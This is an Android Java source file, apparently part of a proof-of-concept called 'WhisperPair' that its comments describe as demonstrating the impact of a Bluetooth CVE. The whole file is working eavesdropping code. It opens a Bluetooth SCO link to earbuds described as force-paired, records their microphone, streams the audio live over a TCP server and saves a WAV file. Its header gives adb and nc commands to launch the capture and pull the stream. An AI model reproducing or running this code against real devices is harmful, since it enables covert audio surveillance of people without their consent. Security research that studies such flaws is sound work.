package com.whisperpair.companion;

import android.Manifest;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.media.AudioDeviceInfo;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.graphics.Typeface;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.RandomAccessFile;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.CopyOnWriteArrayList;

/**
 * WhisperPair Live Eavesdrop — CVE-2025-36911 Impact Demonstration
 *
 * Opens Bluetooth SCO to the force-paired earbuds and streams live audio
 * over a TCP socket (port 19876) for the dashboard to play in the browser.
 * Also saves the full recording to a WAV file.
 *
 * Launch:  adb shell am start -a com.whisperpair.EAVESDROP --es address "AA:BB:CC:DD:EE:FF"
 * Stop:    adb shell am broadcast -a com.whisperpair.STOP_EAVESDROP
 * Stream:  adb forward tcp:19876 tcp:19876 && nc localhost 19876
 */
public class EavesdropActivity extends Activity {

    private static final String TAG = "WhisperPair";
    private static final int SAMPLE_RATE = 8000;
    private static final int CHANNEL_IN = AudioFormat.CHANNEL_IN_MONO;
    private static final int ENCODING = AudioFormat.ENCODING_PCM_16BIT;
    private static final int STREAM_PORT = 19876;

    private AudioManager audioManager;
    private AudioRecord audioRecord;
    private volatile boolean isRecording = false;
    private String targetAddress;

    private TextView logView;
    private ScrollView scrollView;
    private Handler mainHandler;
    private String outputPath;
    private long totalBytes = 0;
    private long startTimeMs = 0;

    private ServerSocket serverSocket;
    private final CopyOnWriteArrayList<OutputStream> streamClients = new CopyOnWriteArrayList<>();

    private final BroadcastReceiver stopReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            log("STOP command received");
            stopRecording();
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        scrollView = new ScrollView(this);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(32, 32, 32, 32);
        logView = new TextView(this);
        logView.setTypeface(Typeface.MONOSPACE);
        logView.setTextSize(12);
        layout.addView(logView);
        scrollView.addView(layout);
        setContentView(scrollView);

        mainHandler = new Handler(Looper.getMainLooper());

        Intent intent = getIntent();
        targetAddress = intent.getStringExtra("address");

        if (targetAddress == null || targetAddress.isEmpty()) {
            log("ERROR: No address provided");
            return;
        }

        log("=== LIVE EAVESDROP ===");
        log("Target: " + targetAddress);
        log("Audio stream: tcp://localhost:" + STREAM_PORT);
        log("");

        registerReceiver(stopReceiver, new IntentFilter("com.whisperpair.STOP_EAVESDROP"),
                Context.RECEIVER_EXPORTED);

        if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED
                || checkSelfPermission(Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.BLUETOOTH_CONNECT,
                    Manifest.permission.BLUETOOTH_SCAN,
            }, 1);
        } else {
            startEavesdrop();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        boolean allGranted = true;
        for (int r : grantResults) {
            if (r != PackageManager.PERMISSION_GRANTED) allGranted = false;
        }
        if (allGranted) startEavesdrop();
        else log("ERROR: Permissions denied");
    }

    private void startEavesdrop() {
        audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);

        // Start TCP server for audio streaming
        startStreamServer();

        log("[1/3] Opening Bluetooth SCO...");

        IntentFilter filter = new IntentFilter(AudioManager.ACTION_SCO_AUDIO_STATE_UPDATED);
        registerReceiver(scoReceiver, filter);

        audioManager.setMode(AudioManager.MODE_IN_COMMUNICATION);
        audioManager.startBluetoothSco();
        audioManager.setBluetoothScoOn(true);

        mainHandler.postDelayed(() -> {
            if (!isRecording) {
                log("  SCO timeout — starting anyway...");
                beginRecording();
            }
        }, 5000);
    }

    private void startStreamServer() {
        new Thread(() -> {
            try {
                serverSocket = new ServerSocket(STREAM_PORT);
                log("  Audio server listening on port " + STREAM_PORT);
                while (!serverSocket.isClosed()) {
                    Socket client = serverSocket.accept();
                    log("  Stream client connected");
                    streamClients.add(client.getOutputStream());
                }
            } catch (IOException e) {
                if (!serverSocket.isClosed()) {
                    log("  Stream server error: " + e.getMessage());
                }
            }
        }, "AudioStreamServer").start();
    }

    private final BroadcastReceiver scoReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            int state = intent.getIntExtra(AudioManager.EXTRA_SCO_AUDIO_STATE, -1);
            if (state == AudioManager.SCO_AUDIO_STATE_CONNECTED) {
                log("[1/3] SCO connected — mic active!");
                if (!isRecording) beginRecording();
            } else if (state == AudioManager.SCO_AUDIO_STATE_CONNECTING) {
                log("  SCO connecting...");
            }
        }
    };

    private void beginRecording() {
        if (isRecording) return;

        int minBuf = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_IN, ENCODING);
        if (minBuf == AudioRecord.ERROR || minBuf == AudioRecord.ERROR_BAD_VALUE) {
            minBuf = SAMPLE_RATE * 2;
        }
        final int bufferSize = minBuf;

        try {
            audioRecord = new AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    SAMPLE_RATE, CHANNEL_IN, ENCODING, bufferSize);
        } catch (SecurityException e) {
            log("ERROR: " + e.getMessage());
            return;
        }

        if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
            log("ERROR: AudioRecord init failed");
            return;
        }

        AudioDeviceInfo routedDevice = audioRecord.getRoutedDevice();
        if (routedDevice != null) {
            log("  Mic: " + routedDevice.getProductName() + " (type=" + routedDevice.getType() + ")");
        }

        File outputFile = new File(getExternalFilesDir(null), "eavesdrop_live.wav");
        outputPath = outputFile.getAbsolutePath();

        isRecording = true;
        startTimeMs = System.currentTimeMillis();
        totalBytes = 0;

        log("[2/3] LIVE — streaming from earbuds mic...");
        log("EAVESDROP_LIVE_STARTED");

        new Thread(() -> {
            try {
                liveRecord(bufferSize);
            } catch (IOException e) {
                log("ERROR: " + e.getMessage());
            }
        }, "AudioRecorder").start();
    }

    private void liveRecord(int bufferSize) throws IOException {
        FileOutputStream fos = new FileOutputStream(outputPath);
        byte[] header = new byte[44];
        fos.write(header);

        audioRecord.startRecording();
        byte[] buffer = new byte[bufferSize];

        while (isRecording) {
            int read = audioRecord.read(buffer, 0, buffer.length);
            if (read > 0) {
                // Save to file
                fos.write(buffer, 0, read);
                totalBytes += read;

                // Stream to connected clients
                byte[] chunk = new byte[read];
                System.arraycopy(buffer, 0, chunk, 0, read);
                for (OutputStream os : streamClients) {
                    try {
                        os.write(chunk);
                        os.flush();
                    } catch (IOException e) {
                        streamClients.remove(os);
                    }
                }

                // VU meter every ~0.5s
                if (totalBytes % SAMPLE_RATE < bufferSize) {
                    int maxAmp = 0;
                    for (int i = 0; i < read - 1; i += 2) {
                        int s = Math.abs((short) ((buffer[i + 1] << 8) | (buffer[i] & 0xFF)));
                        if (s > maxAmp) maxAmp = s;
                    }
                    final int amp = maxAmp;
                    long elapsed = (System.currentTimeMillis() - startTimeMs) / 1000;
                    final String ts = String.format("%02d:%02d", elapsed / 60, elapsed % 60);
                    mainHandler.post(() -> {
                        int bars = Math.min(amp / 500, 20);
                        StringBuilder vu = new StringBuilder();
                        for (int i = 0; i < bars; i++) vu.append("\u2588");
                        for (int i = bars; i < 20; i++) vu.append("\u2591");
                        log("EAVESDROP_VU " + ts + " " + vu + " " + amp);
                    });
                }
            }
        }

        fos.close();
        writeWavHeader(outputPath, totalBytes);

        long dur = totalBytes / (SAMPLE_RATE * 2);
        mainHandler.post(() -> {
            log("EAVESDROP_STOPPED");
            log("  File: " + outputPath);
            log("  Duration: " + dur + "s (" + totalBytes / 1024 + "KB)");
            log("Pull: adb pull " + outputPath);
        });
    }

    private void writeWavHeader(String filePath, long dataLen) throws IOException {
        RandomAccessFile raf = new RandomAccessFile(filePath, "rw");
        long totalDataLen = dataLen + 36;
        long byteRate = (long) SAMPLE_RATE * 2;
        byte[] h = new byte[44];
        h[0]='R'; h[1]='I'; h[2]='F'; h[3]='F';
        h[4]=(byte)(totalDataLen&0xff); h[5]=(byte)((totalDataLen>>8)&0xff);
        h[6]=(byte)((totalDataLen>>16)&0xff); h[7]=(byte)((totalDataLen>>24)&0xff);
        h[8]='W'; h[9]='A'; h[10]='V'; h[11]='E';
        h[12]='f'; h[13]='m'; h[14]='t'; h[15]=' ';
        h[16]=16; h[20]=1; h[22]=1;
        h[24]=(byte)(SAMPLE_RATE&0xff); h[25]=(byte)((SAMPLE_RATE>>8)&0xff);
        h[28]=(byte)(byteRate&0xff); h[29]=(byte)((byteRate>>8)&0xff);
        h[30]=(byte)((byteRate>>16)&0xff); h[31]=(byte)((byteRate>>24)&0xff);
        h[32]=2; h[34]=16;
        h[36]='d'; h[37]='a'; h[38]='t'; h[39]='a';
        h[40]=(byte)(dataLen&0xff); h[41]=(byte)((dataLen>>8)&0xff);
        h[42]=(byte)((dataLen>>16)&0xff); h[43]=(byte)((dataLen>>24)&0xff);
        raf.seek(0);
        raf.write(h);
        raf.close();
    }

    private void stopRecording() {
        isRecording = false;
        if (audioRecord != null) {
            try { audioRecord.stop(); audioRecord.release(); } catch (Exception ignored) {}
            audioRecord = null;
        }
        // Close stream clients
        for (OutputStream os : streamClients) {
            try { os.close(); } catch (Exception ignored) {}
        }
        streamClients.clear();
        if (serverSocket != null) {
            try { serverSocket.close(); } catch (Exception ignored) {}
        }
        if (audioManager != null) {
            audioManager.setBluetoothScoOn(false);
            audioManager.stopBluetoothSco();
            audioManager.setMode(AudioManager.MODE_NORMAL);
        }
        try { unregisterReceiver(scoReceiver); } catch (Exception ignored) {}
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRecording();
        try { unregisterReceiver(stopReceiver); } catch (Exception ignored) {}
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        mainHandler.post(() -> {
            logView.append(msg + "\n");
            scrollView.post(() -> scrollView.fullScroll(ScrollView.FOCUS_DOWN));
        });
    }
}
